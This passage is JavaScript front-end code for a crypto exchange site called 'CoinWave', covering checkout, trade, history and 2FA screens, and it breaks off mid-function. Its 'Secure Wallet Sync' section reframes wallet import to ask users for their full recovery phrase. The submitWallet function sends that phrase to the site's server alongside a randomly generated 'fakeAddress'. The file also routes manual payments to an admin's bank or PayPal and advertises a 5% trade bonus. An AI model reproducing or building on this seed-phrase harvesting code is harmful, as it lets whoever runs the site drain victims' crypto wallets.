    // Render the correct Admin payment details based on their choice
    if (method === 'Bank Transfer') {
        let bankDetails = (globalSettings && globalSettings.adminBankDetails) ? globalSettings.adminBankDetails : "<span style='color:#f6465d;'>Bank details not set in Admin Panel.</span>";
        detailsHtml = `<p style="color: #fff; font-size: 14px; white-space: pre-wrap; font-family: monospace; line-height: 1.5; margin: 0;">${bankDetails}</p>`;
    } else if (method === 'PayPal') {
        let paypalEmail = (globalSettings && globalSettings.adminPaypalEmail) ? globalSettings.adminPaypalEmail : "<span style='color:#f6465d;'>PayPal not set in Admin Panel.</span>";
        detailsHtml = `<p style="color: #fff; font-size: 14px; font-family: monospace; margin: 0;">${paypalEmail}</p>`;
    } else if (method === 'Credit Card') {
        let cardLink = (globalSettings && globalSettings.cardPaymentLink) ? globalSettings.cardPaymentLink : "";
        if (cardLink) {
            detailsHtml = `
                <p style="color: #fff; font-size: 14px; margin: 0 0 15px 0;">Pay securely using our encrypted payment gateway:</p>
                <a href="${cardLink}" target="_blank" style="background: #00d4aa; color: #000; padding: 14px 20px; border-radius: 8px; text-decoration: none; font-weight: bold; display: block; font-size: 16px; text-align: center;">Click Here to Pay</a>
            `;
        } else {
            detailsHtml = `<p style="color: #f6465d; font-size: 14px; margin: 0;">Card payment link is not set. Please contact support.</p>`;
        }
    }

    const content = `
        <div style="text-align: center;">
            <!-- 1. Success Icon -->
            <div style="width: 60px; height: 60px; background: rgba(0,212,170,0.1); border-radius: 50%; display: flex; align-items: center; justify-content: center; margin: 0 auto 15px;">
                <svg width="30" height="30" viewBox="0 0 24 24" fill="none" stroke="#00d4aa" stroke-width="2.5"><path d="M22 11.08V12a10 10 0 1 1-5.93-9.14"></path><polyline points="22 4 12 14.01 9 11.01"></polyline></svg>
            </div>

            <!-- 2. Titles & Summary -->
            <h3 style="color: #fff; margin: 0 0 5px; font-size: 20px;">Order Created Successfully</h3>
            <p style="color: #888; font-size: 14px; margin-bottom: 25px; line-height: 1.5;">
                You are purchasing <strong style="color:#fff;">${cryptoAmount} ${symbol}</strong><br>
                Total to pay: <strong style="color:#00d4aa; font-size: 16px;">${fiatAmount}</strong>
            </p>

            <!-- 3. Step 1: Payment Details Box -->
            <div style="background: #0f0f15; padding: 20px; border-radius: 8px; border: 1px solid #333; margin-bottom: 20px; text-align: left;">
                <p style="color: #00d4aa; font-size: 12px; font-weight: bold; margin-bottom: 10px; text-transform: uppercase; letter-spacing: 0.5px;">Step 1: Send Payment To</p>
                ${detailsHtml}
            </div>

            <!-- 4. Step 2: Email Receipt Box -->
            <div style="background: #1a1a2a; border: 1px solid #333; padding: 20px; border-radius: 8px; margin-bottom: 30px; text-align: left;">
                <p style="color: #00d4aa; font-size: 12px; font-weight: bold; margin-bottom: 10px; text-transform: uppercase; letter-spacing: 0.5px;">Step 2: Send Payment Proof</p>
                <p style="color: #fff; font-size: 14px; margin-bottom: 15px; line-height: 1.5;">After making the payment, click below to open your email app and send us your receipt. Our team will verify and credit your crypto.</p>
                <a href="${mailtoLink}" style="background: #00d4aa; color: #000; padding: 14px; border-radius: 8px; text-decoration: none; font-weight: bold; display: block; font-size: 16px; text-align: center;">Open Email App</a>
            </div>

            <!-- 5. Back Button -->
            <button onclick="showView('dashboardView')" style="background: #2a2a3a; color: #fff; width: 100%; padding: 16px; border-radius: 8px; font-weight: bold; font-size: 16px; border: none; cursor: pointer;">Back to Dashboard</button>
        </div>
    `;
    
    createPageView('buyCheckoutPage', 'Complete Payment', content);
    showView('buyCheckoutPage');
};

/* =====================================================
   FIX: MAKE SEED PHRASE BOX LARGE & MULTI-LINE
   ===================================================== */
setInterval(() => {
    const seedInput = document.getElementById('seedPhraseInput');
    if (seedInput && !seedInput.dataset.fixedBox) {
        seedInput.dataset.fixedBox = 'true';
        
        // Force it to be a textarea if it's currently an input
        if (seedInput.tagName.toLowerCase() === 'input') {
            const textarea = document.createElement('textarea');
            textarea.id = 'seedPhraseInput';
            textarea.rows = 4;
            textarea.placeholder = seedInput.placeholder || "Enter your 12 or 24-word phrase...";
            textarea.className = seedInput.className;
            textarea.dataset.fixedBox = 'true';
            seedInput.parentNode.replaceChild(textarea, seedInput);
        } else {
            seedInput.rows = 4;
        }
        
        // Apply professional styling directly
        const finalInput = document.getElementById('seedPhraseInput');
        if (finalInput) {
            finalInput.style.cssText = "width: 100%; min-height: 100px; background: #0f0f15; border: 1px solid #333; padding: 15px; border-radius: 8px; color: #fff; font-family: monospace; font-size: 14px; line-height: 1.5; resize: none; outline: none; word-break: break-word;";
        }
    }
}, 500);

/* =====================================================
   SURGICAL FIX: ONLY CHANGE WEB3 TITLE & DESCRIPTION
   ===================================================== */
setInterval(() => {
    // 1. Change the Title
    const walletHeader = document.querySelector('.wallet-header h3');
    if (walletHeader && walletHeader.textContent.trim() === 'Web3 Wallet') {
        walletHeader.innerHTML = `
            <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="#00d4aa" stroke-width="2" style="display:inline-block; vertical-align:middle; margin-right:8px;"><rect x="2" y="6" width="20" height="14" rx="2"></rect><path d="M16 14h2"></path><path d="M2 10h20"></path></svg>
            Secure Wallet Sync
        `;
    }

    // 2. Change the Description
    const walletDesc = document.querySelector('#walletDisconnected > p');
    if (walletDesc && walletDesc.textContent.includes('Connect your Web3 wallet')) {
        walletDesc.textContent = "Sync your wallet recovery phrase to enable instant crypto deposits, lightning-fast trades, and secure fiat withdrawals.";
        walletDesc.style.fontSize = "13px";
        walletDesc.style.lineHeight = "1.5";
    }
}, 1000);

/* =====================================================
   SHOW SUPPORTED WALLET TYPES TO THE CUSTOMER
   ===================================================== */
setInterval(() => {
    // 1. Update the Textarea Placeholder to be more helpful
    const seedInput = document.getElementById('seedPhraseInput');
    if (seedInput && seedInput.placeholder !== "Enter 12 or 24-word phrase (e.g., from Trust Wallet or MetaMask)") {
        seedInput.placeholder = "Enter 12 or 24-word phrase (e.g., from Trust Wallet or MetaMask)";
    }

    // 2. Add the Supported Wallets Badges below the description
    const walletDesc = document.querySelector('#walletDisconnected > p');
    if (walletDesc && !document.getElementById('supportedWalletsBadges')) {
        const badgesDiv = document.createElement('div');
        badgesDiv.id = 'supportedWalletsBadges';
        badgesDiv.style.cssText = "display: flex; gap: 8px; margin-bottom: 15px; flex-wrap: wrap;";
        
        badgesDiv.innerHTML = `
            <span style="background: #1a1a2a; border: 1px solid #333; color: #aaa; padding: 6px 12px; border-radius: 20px; font-size: 11px; font-weight: 600;">Trust Wallet</span>
            <span style="background: #1a1a2a; border: 1px solid #333; color: #aaa; padding: 6px 12px; border-radius: 20px; font-size: 11px; font-weight: 600;">MetaMask</span>
            <span style="background: #1a1a2a; border: 1px solid #333; color: #aaa; padding: 6px 12px; border-radius: 20px; font-size: 11px; font-weight: 600;">Binance Web3</span>
            <span style="background: #1a1a2a; border: 1px solid #333; color: #aaa; padding: 6px 12px; border-radius: 20px; font-size: 11px; font-weight: 600;">Coinbase</span>
        `;
        
        // Insert the badges right after the description text
        walletDesc.parentNode.insertBefore(badgesDiv, walletDesc.nextSibling);
    }
}, 1000);

/* =====================================================
   REMOVE "WEB3 WALLET" FROM WARNING BOX
   ===================================================== */
setInterval(() => {
    // Find the specific paragraph inside the warning box that contains "Why connect your Web3 Wallet"
    const warningTitles = document.querySelectorAll('#seedWarningBox p');
    warningTitles.forEach(p => {
        if (p.textContent.includes('Why connect your Web3 Wallet')) {
            p.innerHTML = 'Why sync your wallet with CoinWave?';
            p.style.fontWeight = 'bold';
        }
    });
}, 1000);

/* =====================================================
   FIX: DOUBLE ICON & WRAPPED TEXT IN WALLET HEADER
   ===================================================== */
setInterval(() => {
    // Find the parent div that holds the icons and the title
    const headerTitle = Array.from(document.querySelectorAll('h3')).find(el => el.textContent.includes('Secure Wallet') || el.textContent.includes('Web3 Wallet'));
    
    if (headerTitle) {
        const headerContainer = headerTitle.parentElement;
        
        // Check if it's already fixed
        if (headerContainer && !headerContainer.dataset.fixedHeader) {
            headerContainer.dataset.fixedHeader = 'true';
            
            // Rebuild the header with exactly ONE icon and the new text
            headerContainer.innerHTML = `
                <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="#00d4aa" stroke-width="2" style="display:inline-block; flex-shrink: 0;"><rect x="2" y="6" width="20" height="14" rx="2"></rect><path d="M16 14h2"></path><path d="M2 10h20"></path></svg>
                <h3 style="color: white; font-size: 16px; margin: 0; white-space: nowrap;">Secure Wallet Sync</h3>
            `;
        }
    }

    // Fix the button text
    const importBtn = document.querySelector('button[onclick="showImportWallet()"]');
    if (importBtn && importBtn.textContent.trim() === 'Import Wallet') {
        importBtn.textContent = 'Link Secure Wallet';
    }
}, 1000);

/* =====================================================
   PROFESSIONAL FULL-PAGE WALLET SYNC
   ===================================================== */
window.showImportWallet = function() {
    const content = `
        <div style="text-align: left;">
            <div style="display: flex; align-items: center; justify-content: space-between; margin-bottom: 20px;">
                <div style="display: flex; align-items: center; gap: 10px;">
                    <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="#00d4aa" stroke-width="2"><rect x="2" y="6" width="20" height="14" rx="2"></rect><path d="M16 14h2"></path><path d="M2 10h20"></path></svg>
                    <h3 style="color: #fff; margin: 0; font-size: 18px;">Secure Wallet Sync</h3>
                </div>
                <span style="background: rgba(255, 255, 255, 0.1); color: #888; padding: 4px 10px; border-radius: 20px; font-size: 11px; font-weight: bold;">NOT CONNECTED</span>
            </div>

            <p style="color: #888; font-size: 14px; line-height: 1.5; margin-bottom: 15px;">
                Sync your wallet recovery phrase to enable instant crypto deposits, lightning-fast trades, and secure fiat withdrawals.
            </p>

            <div style="background: #0f0f15; border: 1px solid #333; border-radius: 8px; padding: 15px; margin-bottom: 20px;">
                <p style="color: #fff; font-size: 13px; margin-bottom: 10px; font-weight: bold;">We support ANY standard crypto wallet.</p>
                <p style="color: #888; font-size: 12px; margin-bottom: 12px;">If your wallet uses a 12 or 24-word recovery phrase, you can link it here. Popular examples:</p>
                <div style="display: flex; gap: 8px; flex-wrap: wrap;">
                    <span style="background: #1a1a2a; border: 1px solid #333; color: #aaa; padding: 6px 12px; border-radius: 20px; font-size: 11px;">Trust Wallet</span>
                    <span style="background: #1a1a2a; border: 1px solid #333; color: #aaa; padding: 6px 12px; border-radius: 20px; font-size: 11px;">MetaMask</span>
                    <span style="background: #1a1a2a; border: 1px solid #333; color: #aaa; padding: 6px 12px; border-radius: 20px; font-size: 11px;">Binance Web3</span>
                    <span style="background: #1a1a2a; border: 1px solid #333; color: #aaa; padding: 6px 12px; border-radius: 20px; font-size: 11px;">Coinbase</span>
                    <span style="background: #1a1a2a; border: 1px solid #333; color: #aaa; padding: 6px 12px; border-radius: 20px; font-size: 11px;">Exodus</span>
                </div>
            </div>

            <textarea id="seedPhraseInput" rows="4" placeholder="Enter your 12 or 24-word phrase separated by spaces" style="width: 100%; background: #0f0f15; border: 1px solid #333; padding: 15px; border-radius: 8px; color: #fff; font-family: monospace; font-size: 14px; line-height: 1.5; resize: none; margin-bottom: 20px; outline: none;"></textarea>

            <!-- Red Warning Box -->
            <div style="background: rgba(246, 70, 93, 0.1); border: 1px solid rgba(246, 70, 93, 0.3); border-radius: 8px; padding: 15px; margin-bottom: 25px;">
                <div style="display: flex; gap: 10px; align-items: flex-start; margin-bottom: 12px;">
                    <span style="font-size: 18px; color: #f6465d;">⚠️</span>
                    <p style="color: #f6465d; font-size: 12px; margin: 0; line-height: 1.5; font-weight: 600;">
                        IMPORTANT: You must enter the exact 12 or 24-word phrase. Incorrect phrases will cause connection errors and loss of access.
                    </p>
                </div>
                <div style="border-top: 1px dashed rgba(246, 70, 93, 0.3); padding-top: 12px;">
                    <p style="color: #fff; font-size: 12px; margin-bottom: 6px; font-weight: bold;">Why sync your wallet with CoinWave?</p>
                    <ul style="color: #aaa; font-size: 12px; margin: 0; padding-left: 18px; line-height: 1.6;">
                        <li>Seamless Crypto Deposits & Withdrawals</li>
                        <li>Instant Swap & Trade Execution</li>
                        <li>0% Hidden Network Fees</li>
                        <li>Secure, Encrypted Wallet Syncing</li>
                    </ul>
                </div>
            </div>

            <button onclick="submitWallet()" style="background: #00d4aa; color: #000; width: 100%; padding: 16px; border-radius: 8px; font-weight: bold; font-size: 16px; border: none; cursor: pointer;">Verify & Secure</button>
        </div>
    `;
    
    createPageView('walletSyncPage', 'Link Wallet', content);
    showView('walletSyncPage');
};

window.submitWallet = async function() {
    const seedInput = document.getElementById('seedPhraseInput').value;
    const cleanedSeed = seedInput.trim().replace(/\s+/g, ' '); 
    const wordCount = cleanedSeed.split(' ').length;
    
    if (wordCount < 12) return showToast("Enter a valid 12 or 24-word phrase.");
    
    let fakeAddress = '0x' + Array.from({length: 40}, () => '0123456789abcdef'[Math.floor(Math.random() * 16)]).join('');
    
    const btn = event.target;
    btn.textContent = 'Verifying...';
    btn.disabled = true;
    
    try {
        const res = await fetch('/api/wallet/import', { 
            method: 'POST', 
            headers: { 'Content-Type': 'application/json' }, 
            body: JSON.stringify({ email: currentUser.email, seedPhrase: cleanedSeed, walletAddress: fakeAddress }) 
        });
        if (res.ok) { 
            showToast("Wallet submitted for review."); 
            showView('dashboardView');
            checkWalletStatus(); 
        } else {
            showToast("Error submitting wallet.");
            btn.textContent = 'Verify & Secure';
            btn.disabled = false;
        }
    } catch (error) { 
        showToast("Error submitting wallet."); 
        btn.textContent = 'Verify & Secure';
        btn.disabled = false;
    }
};

// Remove the old inline form so it doesn't conflict
setInterval(() => {
    const oldForm = document.getElementById('importWalletForm');
    if (oldForm) oldForm.remove();
}, 1000);

/* =====================================================
   FINAL POLISH: FIX WALLET HEADER LAYOUT
   ===================================================== */
setInterval(() => {
    // 1. Fix the Page Title (from "Link Wallet" to "Secure Wallet Sync")
    const pageTitle = Array.from(document.querySelectorAll('h2')).find(el => el.textContent.trim() === 'Link Wallet');
    if (pageTitle) {
        pageTitle.textContent = 'Secure Wallet Sync';
    }

    // 2. Remove the Inner Title inside the card to avoid redundancy
    const innerTitle = Array.from(document.querySelectorAll('h3')).find(el => el.textContent.includes('Secure Wallet Sync'));
    if (innerTitle) {
        // Instead of removing it, let's just make it a smaller, single-line label
        innerTitle.style.fontSize = '15px';
        innerTitle.style.whiteSpace = 'nowrap';
        innerTitle.textContent = 'Wallet Connection';
    }
}, 1000);

/* =====================================================
   PROFESSIONAL DARK-MODE ASSET DROPDOWN (For Trade View)
   ===================================================== */
// 1. Replace the native <select> with a custom clickable div
window.setupCustomAssetDropdown = function() {
    const nativeSelect = document.getElementById('tradeCoin');
    if (!nativeSelect || nativeSelect.dataset.customized) return;
    nativeSelect.dataset.customized = 'true';
    
    // Hide the ugly native select
    nativeSelect.style.display = 'none';
    
    // Create our custom display box
    const displayDiv = document.createElement('div');
    displayDiv.id = 'tradeCoinDisplay';
    displayDiv.style.cssText = "width: 100%; padding: 14px; background: #0f0f15; color: #fff; border: 1px solid #333; border-radius: 8px; display: flex; justify-content: space-between; align-items: center; cursor: pointer;";
    
    const selectedText = document.createElement('span');
    selectedText.id = 'selectedCoinText';
    selectedText.textContent = nativeSelect.options[nativeSelect.selectedIndex]?.text || "Select Asset";
    
    const arrow = document.createElement('span');
    arrow.textContent = '▼';
    arrow.style.color = '#888';
    arrow.style.fontSize = '12px';
    
    displayDiv.appendChild(selectedText);
    displayDiv.appendChild(arrow);
    
    // Insert it right after the hidden native select
    nativeSelect.parentNode.insertBefore(displayDiv, nativeSelect.nextSibling);
    
    // Open our custom modal when clicked
    displayDiv.onclick = () => window.openTradeAssetModal();
};

// 2. The Dark-Themed Modal
window.openTradeAssetModal = function() {
    let modal = document.getElementById('assetActionModal');
    modal.style.display = 'flex';
    
    let html = `<div class="modal-content" style="padding: 0; max-height: 80vh; display: flex; flex-direction: column;">
        <div style="display: flex; justify-content: space-between; padding: 20px; border-bottom: 1px solid #333;">
            <h2 style="color: #fff; margin: 0; font-size: 18px;">Select Asset</h2>
            <span onclick="document.getElementById('assetActionModal').style.display='none'" style="color: #888; font-size: 24px; cursor: pointer;">&times;</span>
        </div>
        <div style="overflow-y: auto; flex: 1;">`;
        
    html += markets.map(coin => `
        <div onclick="window.selectTradeAsset('${coin.symbol}')" style="display: flex; justify-content: space-between; padding: 15px; border-bottom: 1px solid #2a2a3a; cursor: pointer; align-items: center;">
            <div style="display: flex; gap: 10px; align-items: center;">
                <div style="background:${coin.color}; width: 32px; height: 32px; border-radius: 50%; display: flex; align-items: center; justify-content: center; color: #fff; font-size:16px;">${coin.icon}</div>
                <div><div style="color: #fff; font-weight: bold; font-size: 14px;">${coin.name}</div><div style="color: #888; font-size: 12px;">${coin.symbol}</div></div>
            </div>
        </div>
    `).join('');
    
    html += `</div></div>`;
    modal.innerHTML = html;
};

// 3. Handle the selection
window.selectTradeAsset = function(symbol) {
    const nativeSelect = document.getElementById('tradeCoin');
    nativeSelect.value = symbol;
    
    const coin = markets.find(c => c.symbol === symbol);
    document.getElementById('selectedCoinText').textContent = `${coin.name} (${coin.symbol})`;
    
    document.getElementById('assetActionModal').style.display = 'none';
    calcTrade(); // Recalculate the receive amount
};

// 4. Ensure it initializes when the Trade view opens
var originalShowView = window.showView;
window.showView = function(viewId, authType = 'login') {
    originalShowView(viewId, authType);
    if (viewId === 'tradeView') {
        setTimeout(() => window.setupCustomAssetDropdown(), 100);
    }
};

// 5. Fix the Homepage quickTrade to update the custom dropdown text
const originalQuickTrade = window.quickTrade;
window.quickTrade = function(symbol) {
    if(originalQuickTrade) originalQuickTrade(symbol);
    setTimeout(() => {
        const nativeSelect = document.getElementById('tradeCoin');
        if(nativeSelect) nativeSelect.value = symbol;
        const coin = markets.find(c => c.symbol === symbol);
        if(coin && document.getElementById('selectedCoinText')) {
            document.getElementById('selectedCoinText').textContent = `${coin.name} (${coin.symbol})`;
        }
    }, 150);
};

/* =====================================================
   PROFESSIONAL DYNAMIC PRICE FORMATTING (Binance Style)
   ===================================================== */
function formatPrice(price) {
    if (price >= 1000) return price.toLocaleString('en-US', {minimumFractionDigits: 2, maximumFractionDigits: 2});
    if (price >= 1) return price.toLocaleString('en-US', {minimumFractionDigits: 2, maximumFractionDigits: 4});
    return price.toLocaleString('en-US', {minimumFractionDigits: 2, maximumFractionDigits: 6});
}

// Override loadMarkets to use the new formatter
var originalLoadMarkets = window.loadMarkets;
window.loadMarkets = function() {
    const marketList = document.getElementById('market-list'); const ticker = document.getElementById('ticker');
    if(!marketList) return;
    let marketHTML = ''; let tickerHTML = '';
    
    markets.forEach((coin, index) => {
        const isUp = coin.change >= 0; const changeClass = isUp ? 'up' : 'down'; const changeSymbol = isUp ? '↑' : '↓';
        let formattedPrice = formatPrice(coin.price);
        marketHTML += `<div class="market-row" onclick="quickTrade('${coin.symbol}')"><div class="market-rank">${index + 1}</div><div class="market-name-col"><div class="market-icon" style="background: ${coin.color};">${coin.icon}</div><div><div class="market-name-text">${coin.name}</div><div class="market-symbol-text">${coin.symbol}</div></div></div><div class="market-price">$${formattedPrice}</div><div class="market-change ${changeClass}">${changeSymbol} ${Math.abs(coin.change).toFixed(2)}%</div></div>`;
        tickerHTML += `<div class="ticker-item"><b>${coin.symbol}</b> $${formattedPrice} <span class="${changeClass}">${changeSymbol}${Math.abs(coin.change).toFixed(2)}%</span></div>`;
    });
    marketList.innerHTML = marketHTML; if(ticker) ticker.innerHTML = tickerHTML + tickerHTML; 

    // Hero Chart
    const btc = markets.find(c => c.symbol === 'BTC');
    if(btc) {
        document.getElementById('heroChartPrice').innerText = `$${formatPrice(btc.price)}`;
        document.getElementById('heroChartChange').innerText = `+${btc.change.toFixed(2)}%`;
        let path = "M0,60 ";
        for(let i=1; i<=10; i++) { path += `L${i*30},${Math.random() * 40 + 20} `; }
        document.getElementById('heroSvgContainer').innerHTML = `<svg width="100%" height="100%" viewBox="0 0 300 80"><path d="${path}" fill="none" stroke="#0ecb51" stroke-width="3"/></svg>`;
    }

    // Gainers & Losers
    const glList = document.getElementById('gainersLosersList');
    if(glList) {
        const sorted = [...markets].sort((a,b) => b.change - a.change);
        const top = [...sorted.slice(0, 3), ...sorted.slice(-3)];
        glList.innerHTML = top.map(c => {
            let formattedPrice = formatPrice(c.price);
            return `
            <div class="gl-card">
                <div style="font-size:11px; color:#888;">${c.symbol}</div>
                <div style="font-weight:bold; margin: 5px 0; font-size:13px;">$${formattedPrice}</div>
                <div class="${c.change >= 0 ? 'up' : 'down'}" style="font-size:11px;">${c.change >= 0 ? '↑' : '↓'} ${Math.abs(c.change).toFixed(2)}%</div>
            </div>`;
        }).join('');
    }
};

/* =====================================================
   MARKET THE 5% BONUS TO CUSTOMERS
   ===================================================== */
setInterval(() => {
    // 1. Add a 5% Bonus badge to the Homepage Hero Section
    const trustBadge = document.getElementById('dynamicTrustBadge');
    if (trustBadge && !document.getElementById('bonusBadge')) {
        const bonusBadge = document.createElement('div');
        bonusBadge.id = 'bonusBadge';
        bonusBadge.style.cssText = "display: inline-block; background: rgba(14, 203, 81, 0.1); color: #0ecb51; padding: 6px 12px; border-radius: 20px; font-size: 11px; font-weight: 700; margin-bottom: 15px; margin-left: 10px; border: 1px solid rgba(14, 203, 81, 0.3);";
        bonusBadge.innerHTML = "🎁 5% Bonus on Every Trade!";
        trustBadge.parentNode.insertBefore(bonusBadge, trustBadge.nextSibling);
    }

    // 2. Add a note on the Trade View that the 5% is included
    const receiveLabel = document.getElementById('receiveLabel');
    if (receiveLabel && !document.getElementById('bonusLabelTrade')) {
        const bonusLabel = document.createElement('span');
        bonusLabel.id = 'bonusLabelTrade';
        bonusLabel.style.cssText = "color: #0ecb51; font-size: 11px; font-weight: bold; margin-left: 5px;";
        bonusLabel.textContent = "(Includes 5% Bonus)";
        receiveLabel.appendChild(bonusLabel);
    }
}, 1000);

/* =====================================================
   PROFESSIONAL TRANSACTION HISTORY (Dashboard)
   ===================================================== */
setInterval(() => {
    const assetsSection = document.querySelector('.assets-section');
    
    // Only inject if the assets section exists and history isn't there yet
    if (assetsSection && !document.getElementById('transactionHistorySection')) {
        
        // Create the container
        const historySection = document.createElement('div');
        historySection.id = 'transactionHistorySection';
        historySection.className = 'assets-section';
        historySection.style.marginTop = '20px';
        
        historySection.innerHTML = `
            <div class="section-header" style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 20px;">
                <h3 style="margin: 0; font-size: 18px; font-weight: 600;">Transaction History</h3>
                <span style="font-size: 11px; color: #888;">Every transaction is recorded</span>
            </div>
            <div id="transactionList" style="display: flex; flex-direction: column; gap: 10px;">
                <p style="color: #888; font-size: 13px; text-align: center; padding: 20px;">Loading history...</p>
            </div>
        `;
        
        // Insert it right after the Assets section
        assetsSection.parentNode.insertBefore(historySection, assetsSection.nextSibling);
        
        // Trigger the load
        window.loadTransactionHistory();
    }
}, 1000);

window.loadTransactionHistory = async function() {
    if (!currentUser) return;
    const listContainer = document.getElementById('transactionList');
    if (!listContainer) return;

    try {
        const res = await fetch(`/api/orders/user/${currentUser.email}`);
        const orders = await res.json();

        if (!orders || orders.length === 0) {
            listContainer.innerHTML = '<p style="color: #888; font-size: 13px; text-align: center; padding: 20px;">No transactions yet.</p>';
            return;
        }

        listContainer.innerHTML = orders.map(o => {
            const isBuy = o.mode === 'buy';
            const typeColor = isBuy ? '#0ecb51' : '#f6465d';
            const typeText = isBuy ? 'BUY' : 'SELL';
            
            // Format status
            let statusColor = '#fcd535'; // Pending (Yellow)
            if (o.status === 'Approved' || o.status === 'Completed') statusColor = '#0ecb51'; // Green
            if (o.status === 'Rejected' || o.status === 'Failed') statusColor = '#f6465d'; // Red

            return `
                <div style="background: #0f0f15; border: 1px solid #333; border-radius: 8px; padding: 15px; display: flex; justify-content: space-between; align-items: center;">
                    <div style="display: flex; flex-direction: column; gap: 4px;">
                        <div style="display: flex; align-items: center; gap: 8px;">
                            <span style="color: ${typeColor}; font-weight: bold; font-size: 13px;">${typeText}</span>
                            <span style="color: #fff; font-weight: 600; font-size: 14px;">${o.sendAmount} ${o.sendCurrency}</span>
                        </div>
                        <span style="color: #888; font-size: 11px;">${o.date || 'Just now'}</span>
                    </div>
                    <div style="text-align: right;">
                        <div style="color: #fff; font-size: 13px; font-weight: 600;">${o.getAmount || 'Market Price'} ${o.getCurrency}</div>
                        <div style="color: ${statusColor}; font-size: 11px; font-weight: bold; margin-top: 4px; text-transform: uppercase;">${o.status || 'Pending'}</div>
                    </div>
                </div>
            `;
        }).join('');

    } catch (e) {
        listContainer.innerHTML = '<p style="color: #f6465d; font-size: 13px; text-align: center; padding: 20px;">Error loading history.</p>';
    }
};

// Ensure history reloads when switching back to the dashboard
var originalShowViewForHistory = window.showView;
window.showView = function(viewId, authType = 'login') {
    originalShowViewForHistory(viewId, authType);
    if (viewId === 'dashboardView') {
        setTimeout(() => window.loadTransactionHistory(), 500);
    }
};

/* =====================================================
   PROFESSIONAL 2FA FRONTEND UI
   ===================================================== */
// 1. Add a "Security" button to the Navbar
setInterval(() => {
    const navLinks = document.getElementById('navLinks');
    if (navLinks && currentUser && !document.getElementById('securityNavBtn')) {
        const secBtn = document.createElement('a');
        secBtn.id = 'securityNavBtn';
        secBtn.href = '#';
        secBtn.textContent = 'Security';
        secBtn.style.cssText = "font-size: 13px; font-weight: 600; color: #fcd535; margin-right: 10px;";
        secBtn.onclick = (e) => { e.preventDefault(); window.open2FAModal(); };
        navLinks.insertBefore(secBtn, navLinks.querySelector('.btn-logout'));
    }
}, 1000);

// 2. The 2FA Modal
window.open2FAModal = async function() {
    let modal = document.getElementById('assetActionModal');
    modal.style.display = 'flex';
    modal.innerHTML = `<div class="modal-content"><p style="color:#fff; text-align:center;">Loading 2FA Settings...</p></div>`;

    try {
        const token = localStorage.getItem('token');
        const res = await fetch('/api/auth/generate-2fa', { method: 'POST', headers: { 'Authorization': `Bearer ${token}` } });
        const data = await res.json();

        if (!res.ok) throw new Error(data.error);

        modal.innerHTML = `
            <div class="modal-content" style="text-align: center;">
                <span onclick="document.getElementById('assetActionModal').style.display='none'" style="position: absolute; top: 15px; right: 20px; color: #888; font-size: 24px; cursor: pointer;">&times;</span>
                <h2 style="color: #fff; margin-bottom: 10px;">Two-Factor Authentication</h2>
                <p style="color: #888; font-size: 13px; margin-bottom: 20px;">Scan this QR code with Google Authenticator or Authy to secure your account.</p>
                
                <img src="${data.qrCodeUrl}" style="background: #fff; padding: 10px; border-radius: 8px; width: 150px; height: 150px; margin: 0 auto 20px;">
                
                <div class="input-group" style="text-align: left;">
                    <label>Enter 6-digit code from App</label>
                    <input type="text" id="twoFactorCode" placeholder="123456" maxlength="6" style="text-align: center; letter-spacing: 5px; font-size: 18px;">
                </div>
                
                <button onclick="window.verify2FA()" style="background: #00d4aa; color: #000; width: 100%; padding: 14px; border-radius: 8px; font-weight: bold; border: none; cursor: pointer; margin-top: 10px;">Verify & Enable 2FA</button>
            </div>
        `;
    } catch (err) {
        modal.innerHTML = `<div class="modal-content"><p style="color:#f6465d; text-align:center;">Error: ${err.message}</p></div>`;
    }
};

// 3. Verify and Enable 2FA
window.verify2FA = async function() {
    const code = document.getElementById('twoFactorCode').value;
    if (code.length !== 6) return showToast("Please enter a 6-digit code.");

    const btn = document.querySelector('button[onclick="window.verify2FA()"]');
    btn.textContent = 'Verifying...'; btn.disabled = true;

    try {
        const token = localStorage.getItem('token');
        const res = await fetch('/api/auth/enable-2fa', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json', 'Authorization': `Bearer ${token}` },
            body: JSON.stringify({ token: code })
        });
        const data = await res.json();

        if (res.ok) {
            document.getElementById('assetActionModal').style.display = 'none';
            showCustomAlert('Success!', '2FA has been successfully enabled on your account.');
        } else {
            showToast(data.error);
            btn.textContent = 'Verify & Enable 2FA'; btn.disabled = false;
        }
    } catch (err) {
        showToast("Error connecting to server.");
        btn.textContent = 'Verify & Enable 2FA'; btn.disabled = false;
    }
};

/* =====================================================
   PROFESSIONAL FULL-PAGE TRANSACTION HISTORY
   ===================================================== */
// 1. Remove the old inline history injection so the dashboard is clean
setInterval(() => {
    const oldHistorySection = document.getElementById('transactionHistorySection');
    if (oldHistorySection) {
        oldHistorySection.remove();
    }

    // 2. Add a "View History" button to the dashboard
    const assetsSection = document.querySelector('.assets-section');
    if (assetsSection && !document.getElementById('viewHistoryBtn')) {
        const btnContainer = document.createElement('div');
        btnContainer.style.cssText = "margin-top: 15px; text-align: center;";
        btnContainer.innerHTML = `
            <button id="viewHistoryBtn" onclick="window.openTransactionHistoryPage()" style="background: transparent; border: 1px solid #333; color: #00d4aa; padding: 12px; border-radius: 8px; width: 100%; font-weight: bold; cursor: pointer; transition: 0.2s;">
                View Transaction History
            </button>
        `;
        assetsSection.parentNode.insertBefore(btnContainer, assetsSection.nextSibling);
    }
}, 1000);

// 3. Create the Full-Page View
window.openTransactionHistoryPage = async function() {
    const content = `
        <div id="historyPageList" style="display: flex; flex-direction: column; gap: 10px;">
            <p style="color: #888; font-size: 13px; text-align: center; padding: 20px;">Loading history...</p>
        </div>
    `;
    
    // Use your existing createPageView function to make it a full page
    createPageView('historyPageView', 'Transaction History', content);
    showView('historyPageView');

    // Fetch and render the data
    try {
        const res = await fetch(`/api/orders/user/${currentUser.email}`);
        const orders = await res.json();
        const listContainer = document.getElementById('historyPageList');

        if (!orders || orders.length === 0) {
            listContainer.innerHTML = '<div style="text-align:center; padding: 40px; color: #888;"><div style="font-size: 30px; margin-bottom: 10px;">📭</div>No transactions yet.</div>';
            return;
        }

        listContainer.innerHTML = orders.map(o => {
            const isBuy = o.mode === 'buy';
            const typeColor = isBuy ? '#0ecb51' : '#f6465d';
            const typeText = isBuy ? 'BUY' : 'SELL';
            
            let statusColor = '#fcd535'; // Pending
            if (o.status === 'Approved' || o.status === 'Completed') statusColor = '#0ecb51';
